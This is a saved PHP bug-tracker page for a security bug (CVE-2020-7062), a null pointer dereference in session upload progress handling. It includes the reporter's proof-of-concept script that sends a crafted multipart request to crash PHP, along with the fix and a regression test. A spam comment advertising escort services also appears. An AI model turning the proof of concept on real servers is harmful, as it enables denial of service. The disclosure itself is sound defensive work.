@@ -1,0 +1,370 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="utf-8">
+    
+        <link rel='alternate' type='application/rss+xml' title='Session related Bug #79221 - RDF' href='rss/bug.php?id=79221'>
+        <link rel='alternate' type='application/rss+xml' title='Session related Bug #79221 - RSS 2.0' href='rss/bug.php?id=79221&format=rss2'>
+        <base href="https://bugs.php.net/">
+    <title>PHP :: Sec Bug #79221 :: Null Pointer Dereference in PHP Session Upload Progress</title>
+    <link rel="shortcut icon" href="https://bugs.php.net/images/favicon.ico">
+    <link rel="stylesheet" href="https://bugs.php.net/css/style.css">
+</head>
+
+<body>
+
+<table id="top" class="head" cellspacing="0" cellpadding="0">
+    <tr>
+        <td class="head-logo">
+            <a href="/"><img src="images/logo.png" alt="Bugs" vspace="2" hspace="2"></a>
+        </td>
+
+        <td class="head-menu">
+            <a href="https://php.net/">php.net</a>&nbsp;|&nbsp;
+            <a href="https://php.net/support.php">support</a>&nbsp;|&nbsp;
+            <a href="https://php.net/docs.php">documentation</a>&nbsp;|&nbsp;
+            <a href="report.php">report a bug</a>&nbsp;|&nbsp;
+            <a href="search.php">advanced search</a>&nbsp;|&nbsp;
+            <a href="search-howto.php">search howto</a>&nbsp;|&nbsp;
+            <a href="stats.php">statistics</a>&nbsp;|&nbsp;
+            <a href="random">random bug</a>&nbsp;|&nbsp;
+            <a href="login.php">login</a>
+        </td>
+    </tr>
+
+    <tr>
+        <td class="head-search" colspan="2">
+            <form method="get" action="search.php">
+                <p class="head-search">
+                    <input type="hidden" name="cmd" value="display">
+                    <small>go to bug id or search bugs for</small>
+                    <input class="small" type="text" name="search_for" value="" size="30">
+                    <input type="image" src="images/small_submit_white.gif" alt="search" style="vertical-align: middle;">
+                </p>
+            </form>
+        </td>
+    </tr>
+</table>
+
+<table class="middle" cellspacing="0" cellpadding="0">
+    <tr>
+        <td class="content">
+<div id="bugheader">
+    <table id="details">
+        <tr id="title">
+            <th class="details" id="number"><a href="bug.php?id=79221">Sec Bug</a>&nbsp;#79221</th>
+            <td id="summary" colspan="5">Null Pointer Dereference in PHP Session Upload Progress</td>
+        </tr>
+        <tr id="submission">
+            <th class="details">Submitted:</th>
+            <td style="white-space: nowrap;">2020-02-04 12:28 UTC</td>
+            <th class="details">Modified:</th>
+            <td style="white-space: nowrap;">2020-02-17 08:21 UTC</td>
+            <td rowspan="6">
+
+
+            </td>
+        </tr>
+
+        <tr id="submitter">
+            <th class="details">From:</th>
+            <td>ryat@php.net</td>
+            <th class="details">Assigned:</th>
+            <td><a href="search.php?cmd=display&amp;assign=stas">stas</a> (<a href="https://people.php.net/stas">profile</a>)</td>
+        </tr>
+
+        <tr id="categorization">
+            <th class="details">Status:</th>
+            <td>Closed</td>
+            <th class="details">Package:</th>
+            <td><a href="search.php?cmd=display&amp;package_name[]=Session+related">Session related</a></td>
+        </tr>
+
+        <tr id="situation">
+            <th class="details">PHP Version:</th>
+            <td>Irrelevant</td>
+            <th class="details">OS:</th>
+            <td>*</td>
+        </tr>
+
+        <tr id="private">
+            <th class="details">Private report:</th>
+            <td>No</td>
+            <th class="details">CVE-ID:</th>
+            <td><a href="https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2020-7062" target="_blank">2020-7062</a></td>
+        </tr>
+    </table>
+</div>
+
+<div class="controls">
+<span id='control_0' class='control active'>View</span>
+<span id='control_3' class='control'><a href='bug.php?id=79221&amp;edit=3'>Add Comment</a></span>
+<span id='control_1' class='control'><a href='bug.php?id=79221&amp;edit=1'>Developer</a></span>
+<span id='control_2' class='control'><a href='bug.php?id=79221&amp;edit=2'>Edit</a></span>
+</div>
+<div class="clear"></div>
+
+
+
+<div class='comment type_comment' ><a name="1580819335">&nbsp;</a><strong>[2020-02-04 12:28 UTC] <a href="//people.php.net/ryat">ryat@php.net</a></strong>
+<pre class='note'>Description:
+------------
+session.c:
+```
+static int php_session_rfc1867_callback(unsigned int event, void *event_data, void **extra) /* {{{ */
+{
+    ...
+	progress = PS(rfc1867_progress);
+
+	switch(event) {
+        ...
+		case MULTIPART_EVENT_END: {
+			multipart_event_end *data = (multipart_event_end *) event_data;
+
+			if (Z_TYPE(progress-&gt;sid) &amp;&amp; progress-&gt;key.s) {
+				if (PS(rfc1867_cleanup)) {
+					php_session_rfc1867_cleanup(progress);
+				} else {
+					SEPARATE_ARRAY(&amp;progress-&gt;data);   &lt;==== &amp;progress-&gt;data is uninitialized
+```
+
+When the session.upload_progress.cleanup INI option is disabled, PHP will be not able to cleanup the progress information as soon as all POST data has been read. But if the upload fails, PHP will wrongly handles the progress information.
+
+PoC:
+
+/www/web/index.php
+```
+&lt;?php
+//do whatever
+?&gt;
+```
+
+poc.php
+```
+&lt;?php
+
+$host = 'localhost';
+$port = '8000';
+$addr = '/index.php';
+
+$type = 'multipart/form-data; boundary=---------------------------20896060251896012921717172737';
+$data = &lt;&lt;&lt;EOF
+-----------------------------20896060251896012921717172737
+Content-Disposition: form-data; name=&quot;PHPSESSID&quot;
+
+session-upload
+-----------------------------20896060251896012921717172737
+Content-Disposition: form-data; name=&quot;PHP_SESSION_UPLOAD_PROGRESS&quot;
+
+ryat
+-----------------------------20896060251896012921717172737
+Content-Disposition: form-data; file=&quot;file&quot;; ryat=&quot;filename&quot;
+
+1
+-----------------------------20896060251896012921717172737--
+EOF;
+$cookie = 'PHPSESSID=session-upload';
+
+$message = &quot;POST $addr  HTTP/1.1\r\n&quot;;
+$message .= &quot;Content-Type: $type\r\n&quot;;
+$message .= &quot;Host: $host\r\n&quot;;
+$message .= &quot;Content-Length: &quot;.strlen($data).&quot;\r\n&quot;;
+$message .= &quot;Connection: Close\r\n&quot;;
+$message .= &quot;Cookie: $cookie\r\n\r\n&quot;;
+$message .= $data;
+
+$fp = fsockopen($host, $port);
+fputs($fp, $message);
+
+$resp = '';
+while ($fp &amp;&amp; !feof($fp)) {
+    $resp .= fread($fp, 1024);
+}
+var_dump($resp);
+
+?&gt;
+```
+
+The issue can be easily triggered when session.upload_progress.cleanup=0, here is a simple proof of concept.
+```
+$php -S localhost:8000 -t /www/web/ -c php.ini
+$php poc.php
+```
+
+Fix:
+```
++   if (!Z_ISUNDEF(progress-&gt;data)) {
+		SEPARATE_ARRAY(&amp;progress-&gt;data);
+		add_assoc_bool_ex(&amp;progress-&gt;data, &quot;done&quot;, sizeof(&quot;done&quot;) - 1, 1);
+		Z_LVAL_P(progress-&gt;post_bytes_processed) = data-&gt;post_bytes_processed;
+		php_session_rfc1867_update(progress, 1);
++	}
+```
+
+Test file:
+```
+--TEST--
+Null Pointer Dereference in PHP Session Upload Progress
+--INI--
+error_reporting=0
+file_uploads=1
+upload_max_filesize=1024
+session.save_path=
+session.name=PHPSESSID
+session.serialize_handler=php
+session.use_strict_mode=0
+session.use_cookies=1
+session.use_only_cookies=0
+session.upload_progress.enabled=1
+session.upload_progress.cleanup=0
+session.upload_progress.prefix=upload_progress_
+session.upload_progress.name=PHP_SESSION_UPLOAD_PROGRESS
+session.upload_progress.freq=1%
+session.upload_progress.min_freq=0.000000001
+--COOKIE--
+PHPSESSID=session-upload
+--POST_RAW--
+Content-Type: multipart/form-data; boundary=---------------------------20896060251896012921717172737
+-----------------------------20896060251896012921717172737
+Content-Disposition: form-data; name=&quot;PHPSESSID&quot;
+
+session-upload
+-----------------------------20896060251896012921717172737
+Content-Disposition: form-data; name=&quot;PHP_SESSION_UPLOAD_PROGRESS&quot;
+
+ryat
+-----------------------------20896060251896012921717172737
+Content-Disposition: form-data; file=&quot;file&quot;; ryat=&quot;filename&quot;
+
+1
+-----------------------------20896060251896012921717172737--
+--FILE--
+&lt;?php
+
+session_start();
+var_dump($_SESSION);
+session_destroy();
+
+--EXPECTF--
+array(0) {
+}
+```
+
+
+</pre>
+</div><h2>Patches</h2>
+<p><a href='patch-add.php?bug_id=79221'>Add a Patch</a></p><h2>Pull Requests</h2>
+<p><a href='gh-pull-add.php?bug_id=79221'>Add a Pull Request</a></p><h2 style="border-bottom:2px solid #666;margin-bottom:0;padding:5px 0;">History</h2><div id='comment_filter' class='controls comments'><span id='type_all' class='control active' onclick='do_comment(this);'>All</span><span id='type_comment' class='control ' onclick='do_comment(this);'>Comments</span><span id='type_log' class='control ' onclick='do_comment(this);'>Changes</span><span id='type_svn' class='control ' onclick='do_comment(this);'>Git/SVN commits</span><span id='type_related' class='control ' onclick='do_comment(this);'>Related reports</span>            </div>
+            <div id='comments_view' style='clear:both;'>
+<div class='comment type_log' ><a name="1581828785">&nbsp;</a><strong>[2020-02-16 04:53 UTC] <a href="//people.php.net/stas">stas@php.net</a></strong>
+<div class='log_note'><div class="changeset">
+<span class="removed">-Assigned To:</span>
+<span class="added">+Assigned To: stas</span>
+</div></div></div><div class='comment type_log' ><a name="1581828801">&nbsp;</a><strong>[2020-02-16 04:53 UTC] <a href="//people.php.net/stas">stas@php.net</a></strong>
+<div class='log_note'><div class="changeset">
+<span class="removed">-CVE-ID:</span>
+<span class="added">+CVE-ID: 2020-7062</span>
+</div></div></div><div class='comment type_svn' ><a name="1581927700">&nbsp;</a><strong>[2020-02-17 08:21 UTC] <a href="//people.php.net/stas">stas@php.net</a></strong>
+<pre class='note'>Automatic comment on behalf of stas
+Revision: <a href="http://git.php.net/?p=php-src.git;a=commit;h=d76f7c6c636b8240e06a1fa29eebb98ad005008a" rel="nofollow">http://git.php.net/?p=php-src.git;a=commit;h=d76f7c6c636b8240e06a1fa29eebb98ad005008a</a>
+Log: Fix <a href='bug.php?id=79221'>bug #79221</a> - Null Pointer Dereference in PHP Session Upload Progress
+</pre>
+</div><div class='comment type_log' ><a name="1581927700">&nbsp;</a><strong>[2020-02-17 08:21 UTC] <a href="//people.php.net/stas">stas@php.net</a></strong>
+<div class='log_note'><div class="changeset">
+<span class="removed">-Status: Assigned</span>
+<span class="added">+Status: Closed</span>
+</div></div></div><div class='comment type_svn' ><a name="1581927701">&nbsp;</a><strong>[2020-02-17 08:21 UTC] <a href="//people.php.net/stas">stas@php.net</a></strong>
+<pre class='note'>Automatic comment on behalf of stas
+Revision: <a href="http://git.php.net/?p=php-src.git;a=commit;h=409965fe1cfa013abd377a5b567e2d19aac163e8" rel="nofollow">http://git.php.net/?p=php-src.git;a=commit;h=409965fe1cfa013abd377a5b567e2d19aac163e8</a>
+Log: Fix <a href='bug.php?id=79221'>bug #79221</a> - Null Pointer Dereference in PHP Session Upload Progress
+</pre>
+</div><div class='comment type_svn' ><a name="1581927702">&nbsp;</a><strong>[2020-02-17 08:21 UTC] <a href="//people.php.net/stas">stas@php.net</a></strong>
+<pre class='note'>Automatic comment on behalf of stas
+Revision: <a href="http://git.php.net/?p=php-src.git;a=commit;h=282bfb109ecd07cd76761c098304a45bd214e439" rel="nofollow">http://git.php.net/?p=php-src.git;a=commit;h=282bfb109ecd07cd76761c098304a45bd214e439</a>
+Log: Fix <a href='bug.php?id=79221'>bug #79221</a> - Null Pointer Dereference in PHP Session Upload Progress
+</pre>
+</div><div class='comment type_svn' ><a name="1581927703">&nbsp;</a><strong>[2020-02-17 08:21 UTC] <a href="//people.php.net/stas">stas@php.net</a></strong>
+<pre class='note'>Automatic comment on behalf of stas
+Revision: <a href="http://git.php.net/?p=php-src.git;a=commit;h=90ae1818d54b3017ed114d45e83924eebafdb7d7" rel="nofollow">http://git.php.net/?p=php-src.git;a=commit;h=90ae1818d54b3017ed114d45e83924eebafdb7d7</a>
+Log: Fix <a href='bug.php?id=79221'>bug #79221</a> - Null Pointer Dereference in PHP Session Upload Progress
+</pre>
+</div><div class='comment type_svn' ><a name="1581933275">&nbsp;</a><strong>[2020-02-17 09:54 UTC] <a href="//people.php.net/dmitry">dmitry@php.net</a></strong>
+<pre class='note'>Automatic comment on behalf of stas
+Revision: <a href="http://git.php.net/?p=php-src.git;a=commit;h=282bfb109ecd07cd76761c098304a45bd214e439" rel="nofollow">http://git.php.net/?p=php-src.git;a=commit;h=282bfb109ecd07cd76761c098304a45bd214e439</a>
+Log: Fix <a href='bug.php?id=79221'>bug #79221</a> - Null Pointer Dereference in PHP Session Upload Progress
+</pre>
+</div><div class='comment type_svn' ><a name="1581963069">&nbsp;</a><strong>[2020-02-17 18:11 UTC] <a href="//people.php.net/cmb">cmb@php.net</a></strong>
+<pre class='note'>Automatic comment on behalf of stas
+Revision: <a href="http://git.php.net/?p=php-src.git;a=commit;h=d76f7c6c636b8240e06a1fa29eebb98ad005008a" rel="nofollow">http://git.php.net/?p=php-src.git;a=commit;h=d76f7c6c636b8240e06a1fa29eebb98ad005008a</a>
+Log: Fix <a href='bug.php?id=79221'>bug #79221</a> - Null Pointer Dereference in PHP Session Upload Progress
+</pre>
+</div><div class='comment type_svn' ><a name="1581963069">&nbsp;</a><strong>[2020-02-17 18:11 UTC] <a href="//people.php.net/cmb">cmb@php.net</a></strong>
+<pre class='note'>Automatic comment on behalf of stas
+Revision: <a href="http://git.php.net/?p=php-src.git;a=commit;h=409965fe1cfa013abd377a5b567e2d19aac163e8" rel="nofollow">http://git.php.net/?p=php-src.git;a=commit;h=409965fe1cfa013abd377a5b567e2d19aac163e8</a>
+Log: Fix <a href='bug.php?id=79221'>bug #79221</a> - Null Pointer Dereference in PHP Session Upload Progress
+</pre>
+</div><div class='comment type_svn' ><a name="1582013675">&nbsp;</a><strong>[2020-02-18 08:14 UTC] <a href="//people.php.net/cmb">cmb@php.net</a></strong>
+<pre class='note'>Automatic comment on behalf of stas
+Revision: <a href="http://git.php.net/?p=php-src.git;a=commit;h=08b47a3d0fcd16a4a8f351d5ee60bfa64e71b39f" rel="nofollow">http://git.php.net/?p=php-src.git;a=commit;h=08b47a3d0fcd16a4a8f351d5ee60bfa64e71b39f</a>
+Log: Fix <a href='bug.php?id=79221'>bug #79221</a> - Null Pointer Dereference in PHP Session Upload Progress
+</pre>
+</div><div class='comment type_svn' ><a name="1582020969">&nbsp;</a><strong>[2020-02-18 10:16 UTC] <a href="//people.php.net/derick">derick@php.net</a></strong>
+<pre class='note'>Automatic comment on behalf of stas
+Revision: <a href="http://git.php.net/?p=php-src.git;a=commit;h=e73d8e2627e6e0aa91441ffa745661c6664906f1" rel="nofollow">http://git.php.net/?p=php-src.git;a=commit;h=e73d8e2627e6e0aa91441ffa745661c6664906f1</a>
+Log: Fix <a href='bug.php?id=79221'>bug #79221</a> - Null Pointer Dereference in PHP Session Upload Progress
+</pre>
+</div><div class='comment type_comment' ><a name="1615791552">&nbsp;</a><strong>[2021-03-15 06:59 UTC] modelmonikasharma &#x61;&#116; gmail &#x64;&#111;&#x74; com</strong>
+<pre class='note'>I Don't thing anyone write better that this. Amazing Post!! Keep it up!
+&lt;a href=&quot;<a href="https://www.aarinkaur.com/&quot;" rel="nofollow">https://www.aarinkaur.com/&quot;</a>&gt;Mumbai Escorts&lt;/a&gt;
+&lt;a href=&quot;<a href="https://www.aarinkaur.com/&quot;" rel="nofollow">https://www.aarinkaur.com/&quot;</a>&gt;Escorts Mumbai&lt;/a&gt;
+</pre>
+</div></div>
+        </td>
+    </tr>
+</table>
+
+<script src='js/util.js'></script>
+<script src='https://ajax.googleapis.com/ajax/libs/jquery/1.4.2/jquery.min.js'></script>
+<script src="js/jquery.cookie.js"></script>
+<script>
+function do_comment(nd)
+{
+    $('#comment_filter > .control.active').removeClass("active");
+    $(nd).addClass("active");
+
+    $.cookie('history_tab', nd.id, { expires: 365 });
+
+    if (nd.id == 'type_all') {
+        $('#comments_view > .comment:hidden').show('slow');
+    } else {
+        $('#comments_view > .comment').each(function(i) {
+            if ($(this).hasClass(nd.id)) {
+                $(this).show('slow');
+            } else {
+                $(this).hide('slow');
+            }
+        });
+    }
+    return false;
+}
+</script>
+<table class="foot" cellspacing="0" cellpadding="0">
+    <tr>
+        <td class="foot-bar" colspan="2">&nbsp;</td>
+    </tr>
+
+    <tr>
+        <td class="foot-copy">
+            <small>
+                <a href="https://php.net/"><img src="images/logo-small.gif" align="left" valign="middle" hspace="3" alt="PHP"></a>
+                <a href="https://php.net/copyright.php">Copyright &copy; 2001-2021 The PHP Group</a><br>
+                All rights reserved.
+            </small>
+        </td>
+        <td class="foot-source">
+            <small>Last updated: Sat Oct 30 19:03:34 2021 UTC</small>
+        </td>
+    </tr>
+</table>
+</body>
+</html>
